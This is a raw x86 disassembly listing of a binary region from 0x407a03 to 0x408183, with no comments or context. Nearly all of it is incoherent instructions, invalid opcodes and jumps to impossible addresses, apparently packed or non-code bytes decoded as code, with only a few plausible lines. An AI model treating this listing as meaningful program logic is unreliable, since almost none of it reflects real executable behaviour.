  407a03:	and    BYTE PTR [ebp+0x45b94962],dl
  407a09:	aam    0x44
  407a0b:	mov    dl,0xef
  407a0d:	xchg   esi,eax
  407a0e:	push   esp
  407a0f:	jmp    0x65b9bd96
  407a14:	call   0x63912bf1
  407a19:	gs push ds
  407a1b:	test   BYTE PTR [edi+0x10],ch
  407a1e:	dec    esi
  407a1f:	mov    edi,0xc0e6d3f8
  407a24:	xor    dh,bh
  407a26:	scas   eax,DWORD PTR es:[edi]
  407a27:	stc    
  407a28:	sub    BYTE PTR [eax],0xd2
  407a2b:	sub    DWORD PTR [ecx+0x4a],ebp
  407a2e:	scas   al,BYTE PTR es:[edi]
  407a2f:	outs   dx,BYTE PTR ds:[esi]
  407a30:	scas   al,BYTE PTR es:[edi]
  407a31:	or     cl,BYTE PTR [eax-0x5f]
  407a34:	and    al,BYTE PTR [eax+0x23]
  407a37:	adc    bl,BYTE PTR [ebp+0x34fee0ec]
  407a3d:	xor    BYTE PTR [ebp-0x6c],ah
  407a40:	push   esi
  407a41:	ror    dh,0x48
  407a44:	repz or al,0x10
  407a47:	or     eax,0x85101534
  407a4c:	lods   eax,DWORD PTR ds:[esi]
  407a4d:	stc    
  407a4e:	mov    ebp,DWORD PTR [ecx-0x2df0650e]
  407a54:	sahf   
  407a55:	mov    esi,0x99ef60d5
  407a5a:	jns    0x407a04
  407a5c:	aas    
  407a5d:	shr    al,cl
  407a5f:	imul   esp,DWORD PTR [esi-0x1ec70d7c],0xffffffb1
  407a66:	fimul  WORD PTR [edi]
  407a68:	out    dx,eax
  407a69:	shl    dl,1
  407a6b:	push   esp
  407a6c:	fwait
  407a6d:	call   0xeedfc6f
  407a72:	xchg   edx,eax
  407a73:	fdivr  DWORD PTR ds:0x102dafeb
  407a79:	and    al,BYTE PTR [ecx+0x14]
  407a7c:	push   ebp
  407a7d:	lea    ebp,[edx+0x3dd4f9d6]
  407a83:	adc    dh,al
  407a85:	sbb    BYTE PTR [esi-0x77],ch
  407a88:	in     al,dx
  407a89:	bound  ebp,QWORD PTR [ebx-0x17]
  407a8c:	push   cs
  407a8d:	add    DWORD PTR [esi+0x20041a50],esi
  407a93:	push   0x1f
  407a95:	rol    ch,0xa1
  407a98:	arpl   WORD PTR [esi],di
  407a9a:	mov    edx,0xc09cf2c4
  407a9f:	adc    al,0x8a
  407aa1:	push   ss
  407aa2:	(bad)  
  407aa3:	mov    al,0x15
  407aa5:	sub    DWORD PTR ds:0x22928c16,eax
  407aab:	jecxz  0x407b1b
  407aad:	ror    esp,cl
  407aaf:	pop    edx
  407ab0:	add    eax,0x90f9e808
  407ab5:	inc    bl
  407ab7:	add    bl,BYTE PTR [eax]
  407ab9:	stos   BYTE PTR es:[edi],al
  407aba:	jg     0x407a5e
  407abc:	iret   
  407abd:	fst    QWORD PTR [edi]
  407abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ac0:	shl    esp,0x8a
  407ac3:	es inc esi
  407ac5:	lods   eax,DWORD PTR ds:[esi]
  407ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ac7:	xchg   al,al
  407ac9:	mov    esi,0x9327de98
  407ace:	xor    al,0x9e
  407ad0:	xor    dh,BYTE PTR [ebx-0x56ddd864]
  407ad6:	fwait
  407ad7:	ins    DWORD PTR es:[edi],dx
  407ad8:	jmp    FWORD PTR [ecx]
  407ada:	pop    ss
  407adb:	push   edx
  407adc:	pop    esi
  407add:	xchg   esp,eax
  407ade:	adc    BYTE PTR [edi+0x566b1a04],0x3e
  407ae5:	sub    DWORD PTR [ebx-0x182b319a],esi
  407aeb:	test   eax,0xc045b69a
  407af0:	xlat   BYTE PTR ds:[ebx]
  407af1:	mov    ah,0x51
  407af3:	addr16 fdiv st(1),st
  407af6:	into   
  407af7:	pop    ebx
  407af8:	shr    ah,cl
  407afa:	xlat   BYTE PTR ds:[ebx]
  407afb:	enter  0xa994,0xc3
  407aff:	jb     0x407b6d
  407b01:	loopne 0x407ac8
  407b03:	sti    
  407b04:	xor    bh,BYTE PTR [eax-0x11bc81aa]
  407b0a:	fwait
  407b0b:	mov    cs,WORD PTR ds:0x933e3c8a
  407b11:	into   
  407b12:	mov    ebx,?
  407b14:	fs xor eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	shr    DWORD PTR [edi-0x36a8043d],1
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b37
  407b4c:	sahf   
  407b4d:	pop    ecx
  407b4e:	test   eax,0x573819c4
  407b53:	fdivr  QWORD PTR [eax+0x3eed8290]
  407b59:	stc    
  407b5a:	arpl   WORD PTR [edi-0x63598855],cx
  407b60:	dec    esp
  407b61:	xor    BYTE PTR [esi+0x5bb78369],ch
  407b67:	sub    DWORD PTR ds:0xe3734b34,eax
  407b6d:	loop   0x407bbf
  407b6f:	mov    bl,0x71
  407b71:	dec    edi
  407b72:	mov    dl,0x55
  407b74:	mov    cl,BYTE PTR [esi+0x4d]
  407b77:	adc    DWORD PTR [edi],esp
  407b79:	mov    eax,0x53d7c845
  407b7e:	xchg   esi,eax
  407b7f:	ss xchg ecx,eax
  407b81:	rol    BYTE PTR [eax+0x6e],1
  407b84:	xor    BYTE PTR [ebx+0x2f],al
  407b87:	sbb    esp,esi
  407b89:	aas    
  407b8a:	sub    ch,BYTE PTR [ebx-0x41]
  407b8d:	pop    ds
  407b8e:	out    0xed,eax
  407b90:	or     BYTE PTR [esi],0x41
  407b93:	jb     0x407b64
  407b95:	mov    bh,0xf5
  407b97:	inc    ebx
  407b98:	(bad)  
  407b99:	pushf  
  407b9a:	call   0x1262de46
  407b9f:	sbb    DWORD PTR cs:[ecx-0x1101329d],edx
  407ba6:	out    dx,eax
  407ba7:	or     esi,DWORD PTR [edx-0x29ca7008]
  407bad:	xor    edx,DWORD PTR [eax-0x1d70d9bf]
  407bb3:	xchg   edx,eax
  407bb4:	push   ss
  407bb5:	jle    0x407b69
  407bb7:	add    al,0xb3
  407bb9:	push   eax
  407bba:	jnp    0x407ba1
  407bbc:	test   BYTE PTR [esi+0x57],0x7a
  407bc0:	sub    ah,BYTE PTR [edx]
  407bc2:	sbb    ebp,0x6a
  407bc5:	adc    ebx,DWORD PTR [ebx-0x7c6b27f0]
  407bcb:	out    dx,al
  407bcc:	retf   
  407bcd:	jns    0x407c3e
  407bcf:	cmc    
  407bd0:	jne    0x407bc2
  407bd2:	jnp    0x407bce
  407bd4:	cwde   
  407bd5:	sub    eax,0x5cb2b27a
  407bda:	test   DWORD PTR [eax+0x2bf7cd8],edi
  407be0:	add    DWORD PTR [edi],0xc11cc884
  407be6:	xchg   dl,bl
  407be8:	pop    edx
  407be9:	jne    0x407bbe
  407beb:	jnp    0x407be9
  407bed:	pop    ebx
  407bee:	test   cl,cl
  407bf0:	stos   DWORD PTR es:[edi],eax
  407bf1:	cmc    
  407bf2:	mov    edi,0xdb826e88
  407bf7:	adc    ebx,DWORD PTR [esi]
  407bf9:	add    DWORD PTR [ebx],ecx
  407bfb:	cmp    al,0x50
  407bfd:	adc    BYTE PTR [edi+0x45],dl
  407c00:	pop    edi
  407c01:	mov    ecx,0xe44cfb8a
  407c06:	inc    ecx
  407c07:	ret    
  407c08:	sbb    ecx,DWORD PTR [ebp+0x8]
  407c0b:	push   ebx
  407c0c:	xor    ah,dh
  407c0e:	sbb    ch,BYTE PTR [ebx-0x2e22a69c]
  407c14:	push   esi
  407c15:	hlt    
  407c16:	pop    esp
  407c17:	fadd   st,st(2)
  407c19:	in     al,dx
  407c1a:	aam    0xe8
  407c1c:	sub    eax,0x7ed8b6df
  407c21:	in     al,0x8e
  407c23:	cs sub al,0xc9
  407c26:	jo     0x407c59
  407c28:	push   esi
  407c29:	stc    
  407c2a:	bound  ecx,QWORD PTR [edx-0x38]
  407c2d:	xchg   esi,eax
  407c2e:	sub    al,0x73
  407c30:	lea    edx,[edx]
  407c32:	je     0x407c32
  407c34:	sti    
  407c35:	fsubr  DWORD PTR ds:0x23b844e
  407c3b:	in     al,dx
  407c3c:	(bad)  
  407c3d:	retf   
  407c3e:	xchg   esp,esi
  407c40:	lods   eax,DWORD PTR ds:[esi]
  407c41:	jo     0x407bc3
  407c43:	les    edx,FWORD PTR [eax-0x7989959e]
  407c49:	aam    0xe2
  407c4b:	cli    
  407c4c:	or     eax,0x9e3e3316
  407c51:	add    eax,0x442258e1
  407c56:	cmp    bh,BYTE PTR [edx+0x4e25513e]
  407c5c:	xor    edi,ecx
  407c5e:	xchg   edx,eax
  407c5f:	das    
  407c60:	jne    0x407c9e
  407c62:	test   esp,edi
  407c64:	lahf   
  407c65:	in     eax,dx
  407c66:	xor    eax,0xd2dd4937
  407c6b:	daa    
  407c6c:	push   esp
  407c6d:	pop    ss
  407c6e:	adc    eax,0xe342be1d
  407c73:	mov    dh,0x72
  407c75:	mov    edi,0x88f24944
  407c7a:	sub    al,0xa6
  407c7c:	mov    ds:0x8f0a6574,al
  407c81:	or     BYTE PTR [eax-0x61],dl
  407c84:	shl    BYTE PTR cs:[eax-0x46234c9],1
  407c8b:	aaa    
  407c8c:	and    al,0xf9
  407c8e:	dec    edi
  407c8f:	add    edx,DWORD PTR gs:[edi-0x76]
  407c93:	add    esp,eax
  407c95:	icebp  
  407c96:	pop    eax
  407c97:	xchg   esi,eax
  407c98:	dec    esp
  407c99:	popf   
  407c9a:	jbe    0x407ce4
  407c9c:	imul   ebp,DWORD PTR [eax+ecx*4],0x6544c3f7
  407ca3:	popf   
  407ca4:	or     al,0xd9
  407ca6:	xor    ah,BYTE PTR [ecx+0x70]
  407ca9:	dec    ecx
  407caa:	and    al,0xee
  407cac:	cld    
  407cad:	xor    cl,BYTE PTR [ecx]
  407caf:	mov    edx,0x65f8bfe6
  407cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb5:	add    ecx,eax
  407cb7:	xchg   dl,al
  407cb9:	(bad)  
  407cba:	mov    ebp,0x4416611b
  407cbf:	idiv   DWORD PTR [esi+0x25]
  407cc2:	pop    ecx
  407cc3:	mov    al,0xa5
  407cc5:	add    eax,0x30ca6306
  407cca:	scas   eax,DWORD PTR es:[edi]
  407ccb:	sti    
  407ccc:	fstp   DWORD PTR [eax+edi*2+0x27]
  407cd0:	idiv   DWORD PTR [esi-0x62f6c567]
  407cd6:	fs cmp ebx,ebp
  407cd9:	dec    DWORD PTR [edi-0x8]
  407cdc:	fs (bad) 
  407cde:	push   ds
  407cdf:	stos   DWORD PTR es:[edi],eax
  407ce0:	push   ecx
  407ce1:	popf   
  407ce2:	cmp    BYTE PTR [ebx-0x58],cl
  407ce5:	xor    al,0x2e
  407ce7:	scas   eax,DWORD PTR es:[edi]
  407ce8:	test   DWORD PTR [ecx-0x30b3201f],eax
  407cee:	in     al,dx
  407cef:	xchg   ebp,eax
  407cf0:	mov    ds:0x9a6f7b19,eax
  407cf5:	fbld   TBYTE PTR [ebp-0x71]
  407cf8:	xor    al,0x20
  407cfa:	xchg   edi,eax
  407cfb:	mov    ds:0xb2179892,eax
  407d00:	or     BYTE PTR [esi+0x72],ch
  407d03:	test   ah,cl
  407d05:	loop   0x407c8a
  407d07:	xor    ebx,ebp
  407d09:	sahf   
  407d0a:	popa   
  407d0b:	cli    
  407d0c:	(bad)  
  407d0d:	jmp    0x8b92:0x836e13b4
  407d14:	cmp    al,0x21
  407d17:	aas    
  407d18:	add    BYTE PTR [edi+0x3c884e89],dl
  407d1e:	std    
  407d1f:	and    bl,ch
  407d21:	mov    esp,ds
  407d23:	adc    al,0x4e
  407d25:	data16 ror BYTE PTR [ebx+0xc],cl
  407d29:	jl     0x407d70
  407d2b:	inc    ebp
  407d2c:	loop   0x407d2c
  407d2e:	xchg   ecx,eax
  407d2f:	push   esp
  407d30:	int3   
  407d31:	pop    esi
  407d32:	out    dx,eax
  407d33:	leave  
  407d34:	mov    eax,0x6bf0fa98
  407d39:	iret   
  407d3a:	mov    cl,0xd0
  407d3c:	fs xchg edi,eax
  407d3e:	mov    esp,0x65027c32
  407d43:	fild   WORD PTR [edi+0x24a0492c]
  407d49:	mov    al,ds:0x65d01e4
  407d4e:	shr    DWORD PTR [esi+esi*4],0x66
  407d52:	scas   al,BYTE PTR es:[edi]
  407d53:	jmp    0x14cb:0xf85d9d47
  407d5a:	lods   eax,DWORD PTR es:[esi]
  407d5c:	aaa    
  407d5d:	cli    
  407d5e:	jns    0x407d71
  407d60:	das    
  407d61:	inc    esp
  407d62:	push   edx
  407d63:	add    DWORD PTR [edx-0x3a],ecx
  407d66:	xchg   ebx,eax
  407d67:	jo     0x407d6c
  407d69:	mov    dl,0xc6
  407d6b:	in     eax,0xfd
  407d6d:	sub    DWORD PTR [edx],0x59
  407d70:	mov    esp,0x78568560
  407d75:	sub    DWORD PTR [ecx],ecx
  407d77:	outs   dx,DWORD PTR ds:[esi]
  407d78:	push   edx
  407d79:	cmp    BYTE PTR [ebx-0x2e],bh
  407d7c:	sbb    eax,edi
  407d7e:	push   ecx
  407d7f:	mov    eax,ds:0x4e279d4d
  407d84:	in     al,0x2c
  407d86:	cmp    eax,DWORD PTR [esi+0x79f21a33]
  407d8c:	test   DWORD PTR [ecx+edx*1-0x65d6c03f],edi
  407d93:	jno    0x407d87
  407d95:	call   0xf20:0x6d0ced0
  407d9c:	dec    ebp
  407d9d:	cwde   
  407d9e:	and    al,0x86
  407da0:	clc    
  407da1:	sahf   
  407da2:	dec    ebp
  407da3:	clc    
  407da4:	in     eax,0x4d
  407da6:	js     0x407e03
  407da8:	je     0x407d9b
  407daa:	fwait
  407dab:	popa   
  407dac:	rol    DWORD PTR [eax+0x14d7d448],cl
  407db2:	in     al,dx
  407db3:	jmp    0x305d0761
  407db8:	inc    edx
  407db9:	leave  
  407dba:	inc    ebx
  407dbb:	imul   edx,DWORD PTR [edi],0x9d830559
  407dc1:	adc    BYTE PTR [ecx-0x77b9405a],bh
  407dc7:	lahf   
  407dc8:	out    dx,al
  407dc9:	out    dx,al
  407dca:	rcpps  xmm0,xmm3
  407dcd:	int    0xba
  407dcf:	push   esi
  407dd0:	cmp    edx,0xdeb0313e
  407dd6:	jne    0x407db1
  407dd8:	scas   eax,DWORD PTR es:[edi]
  407dd9:	push   esi
  407dda:	scas   al,BYTE PTR es:[edi]
  407ddb:	and    eax,DWORD PTR [ebp-0x7f51b2af]
  407de1:	and    eax,eax
  407de3:	sbb    ah,BYTE PTR [edi-0x58]
  407de6:	test   BYTE PTR [ecx-0x3c8bb869],dl
  407dec:	mov    es,edi
  407dee:	(bad)  
  407df0:	inc    edi
  407df1:	pop    esp
  407df2:	mov    ebx,0x7a55fe3b
  407df7:	sbb    esp,DWORD PTR [edi-0x39]
  407dfa:	dec    eax
  407dfb:	dec    ecx
  407dfc:	repz sahf 
  407dfe:	xor    DWORD PTR [ebx-0x37fe9019],esp
  407e04:	mov    dh,0x7e
  407e06:	fsub   DWORD PTR [ebp+0x40293b9b]
  407e0c:	imul   ecx,ebp,0x3e
  407e0f:	out    0x69,eax
  407e11:	dec    esi
  407e12:	pop    es
  407e13:	(bad)  
  407e14:	dec    edi
  407e15:	ds sbb al,0xd4
  407e18:	test   BYTE PTR [eax+0x6c],ch
  407e1b:	lock mov al,BYTE PTR [ecx+0x74344727]
  407e22:	mov    eax,0xe787f8d1
  407e27:	cld    
  407e28:	sar    cl,0x6c
  407e2b:	jle    0x407e3b
  407e2d:	sub    DWORD PTR [ecx],edx
  407e2f:	sbb    al,0x1a
  407e31:	cwde   
  407e32:	jl     0x407e5a
  407e34:	mov    WORD PTR [edx+0x78],gs
  407e37:	sub    al,0x74
  407e39:	jle    0x407df4
  407e3b:	ss cmp dl,al
  407e3e:	push   es
  407e3f:	inc    edi
  407e40:	xchg   ebx,eax
  407e41:	pop    eax
  407e42:	pop    sp
  407e44:	out    dx,eax
  407e45:	aaa    
  407e46:	je     0x407e7f
  407e48:	shr    BYTE PTR [edi-0x5a9dbae8],cl
  407e4e:	out    0xd9,al
  407e50:	jb     0x407e17
  407e52:	jecxz  0x407e10
  407e54:	ins    BYTE PTR es:[edi],dx
  407e55:	adc    edi,DWORD PTR [eax-0x2a]
  407e58:	xchg   ebp,eax
  407e59:	stc    
  407e5a:	js     0x407dec
  407e5c:	jge    0x407ebd
  407e5e:	in     eax,dx
  407e5f:	adc    ah,BYTE PTR [ebx+0x45]
  407e62:	(bad)  
  407e63:	int3   
  407e64:	ins    BYTE PTR es:[edi],dx
  407e65:	inc    edx
  407e66:	sbb    eax,0xfbd5259d
  407e6b:	fs inc esi
  407e6d:	add    DWORD PTR [ebp-0x1e28ae4b],0x9559f67f
  407e77:	dec    edi
  407e78:	push   0xffffffc9
  407e7a:	out    0xe8,al
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	inc    ebx
  407e99:	popf   
  407e9a:	xchg   BYTE PTR [esi+0x7070d507],ah
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407e48
  407ea5:	add    al,0xce
  407ea7:	xor    BYTE PTR [edx+0x4d],0x51
  407eab:	fdiv   DWORD PTR [ebp-0x3]
  407eae:	stos   DWORD PTR es:[edi],eax
  407eaf:	jle    0x407edb
  407eb1:	dec    esp
  407eb2:	sbb    cl,BYTE PTR [eax+0x3a]
  407eb5:	clc    
  407eb6:	(bad)  
  407eb7:	push   esp
  407eb8:	inc    edx
  407eb9:	pushf  
  407eba:	(bad)  
  407ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ebc:	jmp    0x49a4:0xcd55431e
  407ec3:	inc    ebp
  407ec4:	js     0x407ef8
  407ec6:	or     al,0x36
  407ec8:	loop   0x407e79
  407eca:	xchg   edx,eax
  407ecb:	xchg   esp,eax
  407ecc:	jg     0x407ea5
  407ece:	jo     0x407e5a
  407ed0:	ret    
  407ed1:	xchg   edi,eax
  407ed2:	stos   DWORD PTR es:[edi],eax
  407ed3:	xor    dh,BYTE PTR [ecx+0x6265ec90]
  407ed9:	dec    eax
  407eda:	test   eax,esp
  407edc:	outs   dx,BYTE PTR ds:[esi]
  407edd:	mov    al,0xe4
  407edf:	mov    es,ebx
  407ee1:	cld    
  407ee2:	or     al,0x1c
  407ee4:	(bad)  
  407ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ee6:	push   eax
  407ee7:	xchg   edx,eax
  407ee8:	or     edi,eax
  407eea:	stos   BYTE PTR es:[edi],al
  407eeb:	shl    BYTE PTR [edx],0xaa
  407eee:	jg     0x407f42
  407ef0:	fadd   QWORD PTR [ebp+0x588c184]
  407ef6:	inc    edx
  407ef7:	and    DWORD PTR [ecx],esi
  407ef9:	jbe    0x407f48
  407efb:	xchg   ebx,eax
  407efc:	or     BYTE PTR [eax+0x6a],al
  407eff:	jp     0x407ed2
  407f01:	inc    ebp
  407f02:	dec    esp
  407f03:	test   eax,0xecd4980
  407f08:	in     eax,dx
  407f09:	inc    edi
  407f0a:	std    
  407f0b:	sbb    bl,BYTE PTR [ecx-0x9]
  407f0e:	mov    ah,0x6f
  407f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f11:	cli    
  407f12:	retf   
  407f13:	nop
  407f14:	push   eax
  407f15:	sbb    eax,0x1efa1bc2
  407f1a:	in     al,0xd0
  407f1c:	scas   eax,DWORD PTR es:[edi]
  407f1d:	aam    0x74
  407f1f:	jnp    0x407f5e
  407f21:	fisubr WORD PTR [ebx]
  407f23:	adc    DWORD PTR [ebp+eax*8-0x3e],ecx
  407f27:	jns    0x407f7e
  407f29:	(bad)  
  407f2a:	fwait
  407f2b:	xchg   esi,eax
  407f2c:	pop    esi
  407f2e:	sbb    al,0x72
  407f30:	mov    dh,0x89
  407f32:	and    dh,BYTE PTR [edi+0x3e5510b]
  407f38:	ins    DWORD PTR es:[edi],dx
  407f39:	push   edx
  407f3a:	xchg   DWORD PTR [edx-0x4d],eax
  407f3d:	scas   eax,DWORD PTR es:[edi]
  407f3e:	mov    edi,0xa7c15231
  407f43:	dec    edi
  407f44:	adc    ah,bh
  407f46:	mov    edx,0x857de15f
  407f4b:	or     al,dh
  407f4d:	icebp  
  407f4e:	lods   eax,DWORD PTR ds:[esi]
  407f4f:	ins    DWORD PTR es:[edi],dx
  407f50:	sar    DWORD PTR [ebx],cl
  407f52:	push   DWORD PTR [eax-0x77d4f916]
  407f58:	pop    ds
  407f59:	and    BYTE PTR [eax],bl
  407f5b:	push   ss
  407f5c:	mov    esi,0xfc496bca
  407f61:	add    eax,0x22f07567
  407f66:	sub    DWORD PTR [ebp+0x66f60a25],edx
  407f6c:	out    0xf9,al
  407f6e:	mov    cl,0x6c
  407f70:	and    cl,BYTE PTR [ecx-0x6d]
  407f73:	out    0x4c,eax
  407f75:	pop    ebx
  407f76:	xchg   ch,ah
  407f78:	(bad)  
  407f79:	in     eax,0xa3
  407f7b:	mov    cl,0x50
  407f7d:	xor    eax,ebp
  407f7f:	cmc    
  407f80:	pop    eax
  407f81:	ins    DWORD PTR es:[edi],dx
  407f82:	leave  
  407f83:	pop    eax
  407f84:	sbb    ah,BYTE PTR [ecx]
  407f86:	outs   dx,DWORD PTR ds:[esi]
  407f87:	leave  
  407f88:	inc    esi
  407f89:	stos   DWORD PTR es:[edi],eax
  407f8a:	mov    esi,?
  407f8c:	dec    edi
  407f8d:	pop    ebp
  407f8e:	push   edi
  407f8f:	sub    DWORD PTR [esi],0x415957a7
  407f95:	into   
  407f96:	shl    BYTE PTR [ebx],cl
  407f98:	ins    BYTE PTR es:[edi],dx
  407f99:	ins    BYTE PTR es:[edi],dx
  407f9a:	shr    DWORD PTR [eax+edx*2+0x7d77b4ef],1
  407fa1:	mov    cs,WORD PTR [ecx+0x6]
  407fa4:	dec    eax
  407fa5:	mov    al,0x7
  407fa7:	push   edx
  407fa8:	inc    esi
  407fa9:	sub    al,0xe4
  407fab:	in     al,dx
  407fac:	aad    0x2
  407fae:	mov    ebp,0x47992d07
  407fb3:	repnz mov cl,0xe0
  407fb6:	hlt    
  407fb7:	and    edx,DWORD PTR [esi+0x10]
  407fba:	adc    DWORD PTR cs:[ecx+edi*8-0x2a],eax
  407fbf:	pop    ebx
  407fc0:	ror    DWORD PTR [ebx],cl
  407fc2:	bound  edi,QWORD PTR [ebx]
  407fc4:	shl    cl,0x11
  407fc7:	lahf   
  407fc8:	adc    BYTE PTR [ebx-0x4],cl
  407fcb:	js     0x408008
  407fcd:	fs popa 
  407fcf:	mov    ch,0x96
  407fd1:	xchg   edi,eax
  407fd2:	jnp    0x407fd9
  407fd4:	call   0xb450a08
  407fd9:	into   
  407fda:	push   cs
  407fdb:	jg     0x407fa4
  407fdd:	mov    edi,0x9501ff39
  407fe2:	jb     0x40800b
  407fe4:	sub    eax,0x78ef3bfc
  407fe9:	dec    edi
  407fea:	test   al,0xfb
  407fec:	inc    eax
  407fed:	adc    DWORD PTR [ecx-0x43],ecx
  407ff0:	ret    0xf3e1
  407ff3:	call   0xeb928720
  407ff8:	fld    TBYTE PTR [edi]
  407ffa:	fst    QWORD PTR [ecx+0x7b]
  407ffd:	dec    esp
  407ffe:	jle    0x407f99
  408000:	(bad)  
  408001:	mov    esp,0x431b4c1c
  408006:	gs jns 0x408048
  408009:	cmp    BYTE PTR [ecx-0x3d],0x74
  40800d:	mov    WORD PTR [eax],cs
  40800f:	push   esi
  408010:	cmp    ebp,DWORD PTR [ebx-0x58ee6b6f]
  408016:	in     al,0x11
  408018:	push   sp
  40801a:	cdq    
  40801b:	scas   eax,DWORD PTR es:[edi]
  40801c:	dec    esp
  40801d:	xor    al,0xb2
  40801f:	mov    es,WORD PTR [edi-0x1e18796e]
  408025:	in     al,dx
  408026:	js     0x408055
  408028:	test   al,0x48
  40802a:	lock cmp al,BYTE PTR [ebx+0x701a5ce2]
  408031:	in     al,0xda
  408033:	es jmp 0x4080af
  408036:	add    eax,0x800d3de1
  40803b:	adc    esp,DWORD PTR [ebx+eiz*1-0x1a]
  40803f:	jg     0x4080c0
  408041:	adc    esi,DWORD PTR [ecx-0x2c4e5a2e]
  408047:	jmp    0xe6c8d16f
  40804c:	mov    esi,0xc6aaa36e
  408051:	(bad)  
  408053:	mul    ah
  408055:	int    0xff
  408057:	sub    DWORD PTR [ecx-0x31],edi
  40805a:	iret   
  40805b:	cmc    
  40805c:	mov    ah,0x53
  40805e:	push   eax
  40805f:	outs   dx,DWORD PTR ds:[esi]
  408060:	popa   
  408061:	cmp    eax,0x9b055cd4
  408066:	adc    DWORD PTR [eax+0x28f1911a],edx
  40806c:	cmovae esi,ecx
  40806f:	dec    edx
  408070:	push   0x160f0f05
  408075:	shl    DWORD PTR [ebx+edx*4+0x40],1
  408079:	or     ch,BYTE PTR [edi]
  40807b:	and    bl,BYTE PTR [ebx+0x31]
  40807e:	jmp    0xecc8a87b
  408083:	into   
  408084:	mov    bl,0x4f
  408086:	clc    
  408087:	xchg   esi,eax
  408088:	(bad)  
  40808a:	retf   0xee3b
  40808d:	outs   dx,DWORD PTR ds:[esi]
  40808e:	cmp    BYTE PTR [edx-0x5f4d6cce],ah
  408094:	pop    eax
  408096:	mov    dh,0x4
  408098:	mov    edx,0xcf560f47
  40809d:	pop    ebx
  40809e:	adc    ebx,DWORD PTR [edx-0x4e560019]
  4080a4:	dec    DWORD PTR [edi]
  4080a6:	mov    ebx,0x11682828
  4080ab:	mul    cl
  4080ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ae:	(bad)  [esi+0x43b8e985]
  4080b4:	mov    bh,0x6b
  4080b6:	inc    edx
  4080b7:	jg     0x40804d
  4080b9:	pop    esi
  4080ba:	xchg   esi,eax
  4080bb:	outs   dx,BYTE PTR ds:[esi]
  4080bc:	inc    edi
  4080bd:	loop   0x4080c2
  4080bf:	shr    eax,cl
  4080c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080c2:	stos   BYTE PTR es:[edi],al
  4080c3:	in     al,0x48
  4080c5:	dec    esi
  4080c6:	sahf   
  4080c7:	cli    
  4080c8:	push   es
  4080c9:	stos   DWORD PTR es:[edi],eax
  4080ca:	test   BYTE PTR [esi+esi*8-0x39621d5],bl
  4080d1:	fbstp  TBYTE PTR [eax+0x29]
  4080d4:	(bad)  
  4080d5:	popf   
  4080d6:	mov    ebx,0x173852d3
  4080db:	ror    BYTE PTR [ecx+ebp*1],0x57
  4080df:	pop    ds
  4080e0:	push   edx
  4080e1:	mov    WORD PTR ds:0xa08f5f93,ss
  4080e7:	rcl    DWORD PTR [ebx],cl
  4080e9:	or     ch,al
  4080eb:	jle    0x408114
  4080ed:	(bad)  
  4080ee:	(bad)  
  4080f0:	jp     0x40815e
  4080f2:	mov    ebx,DWORD PTR [esi-0x28]
  4080f5:	jne    0x408128
  4080f7:	cmp    eax,0xbac059d
  4080fc:	in     ax,dx
  4080fe:	push   ebp
  4080ff:	cmp    eax,0x98c35a81
  408104:	xchg   ebx,eax
  408105:	call   0x857610f2
  40810a:	cmp    dl,al
  40810c:	push   ebp
  40810d:	jle    0x4080d1
  40810f:	retf   0xe598
  408112:	in     eax,0xa5
  408114:	adc    ebp,DWORD PTR [ebp-0x4]
  408117:	add    cl,dl
  408119:	test   eax,0x497b952b
  40811e:	push   cs
  40811f:	pop    eax
  408120:	mov    ah,0x18
  408122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408123:	xchg   BYTE PTR [eax-0x5479cfd1],bh
  408129:	int3   
  40812a:	mov    ebp,0x2dd68db4
  40812f:	sbb    bl,BYTE PTR [edx+0x12]
  408132:	int    0x3c
  408134:	sub    al,0xa6
  408136:	clc    
  408137:	clc    
  408138:	test   eax,0xad02f296
  40813d:	mov    BYTE PTR [edx+0x54f02bf8],al
  408143:	arpl   ax,di
  408145:	and    BYTE PTR [ecx],0x92
  408148:	fcomp  DWORD PTR [esi+0x56]
  40814b:	int    0x67
  40814d:	fld    TBYTE PTR [ebx+0x7d]
  408150:	aas    
  408151:	adc    BYTE PTR [ecx-0x5257875b],dl
  408157:	aad    0x50
  408159:	scas   al,BYTE PTR es:[edi]
  40815a:	repz pop ds
  40815c:	daa    
  40815d:	or     DWORD PTR [ebx+esi*4],esi
  408160:	cmp    al,0xa5
  408162:	stos   DWORD PTR es:[edi],eax
  408163:	jne    0x4080f6
  408165:	imul   BYTE PTR [ebx-0x19]
  408168:	div    DWORD PTR [edi+0x164d1ccf]
  40816e:	lock add eax,0xbc0cdbd1
  408174:	inc    esp
  408175:	pusha  
  408176:	adc    BYTE PTR [edx-0x4df51cd4],0xbf
  40817d:	div    ecx
  40817f:	aaa    
  408180:	rol    DWORD PTR [eax-0x75],cl
  408183:	lods   al,BYTE PTR ds:[esi]
